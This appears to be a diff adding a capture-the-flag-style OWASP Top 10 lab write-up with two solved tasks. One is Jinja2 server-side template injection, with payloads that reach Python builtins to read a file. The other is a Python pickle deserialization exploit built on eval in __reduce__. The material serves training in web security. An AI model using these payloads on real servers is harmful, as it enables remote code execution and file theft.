@@ -1,0 +1,65 @@
+# OWASP Top 10 2025 Insecure Data Handling
+
+__________________________________________________________________________________________
+
+
+## TASK 3: A05: Injection 
+
+This lab renders raw user input in a Jinja2 template using render_template_string. 
+Test payloads like {{7*7}} or {{config.items()}} to confirm code execution and explore objects.
+
+
+### Why this is vulnerable:
+    User-controlled strings are evaluated as templates. 
+    Attackers can reach config, call Python builtins, or leverage objects to access host resources.
+
+
+### Solution:
+    Prove code execution. Submit {{ 7 * 7 }} to confirm expressions are evaluated.
+    Use {{ config.items() }} or {{ request.__dict__ }} to discover objects exposed to the template.
+    Jinja exposes Flask globals, so run {{ request.application.__globals__.__builtins__.open('flag.txt').read() }} to cat the file on the server.
+
+### Why it works:
+    request.application leads to Flask internals, letting you reach the raw builtins namespace and call open().
+
+__________________________________________________________________________________________
+
+
+## TASK 4: A08: Software or Data Integrity Failures 
+
+The app deserializes untrusted pickle data, allowing attackers to execute arbitrary code and access sensitive files.
+
+### Why This is Vulnerable:
+        No integrity verification   - The app accepts any pickle data without checking signatures or hashes.
+        Unsafe deserialization      - Python's pickle can execute arbitrary code during deserialization.
+        Trust boundary violation    - Untrusted user input is deserialized as if it came from a trusted source.
+        No input validation         - No schema validation or whitelisting of allowed object types.
+
+### Solution:
+        ```
+        import pickle
+        import base64
+        
+        class Malicious:
+            def __reduce__(self):
+                # Return a tuple: (callable, args)
+                # This will execute: open('flag.txt').read()
+                return (eval, ("open('flag.txt').read()",))
+        
+        # Generate and encode the payload
+        payload = pickle.dumps(Malicious())
+        encoded = base64.b64encode(payload).decode()
+        print(encoded)
+        ```
+
+### Fix:
+        Use safe serialization formats (JSON, YAML with safe_load)
+        Verify digital signatures before deserializing
+        Whitelist allowed object types
+        Use restricted unpicklers or sandboxed environments
+        Never deserialize untrusted data
+
+__________________________________________________________________________________________
+
+
+## Appendix:
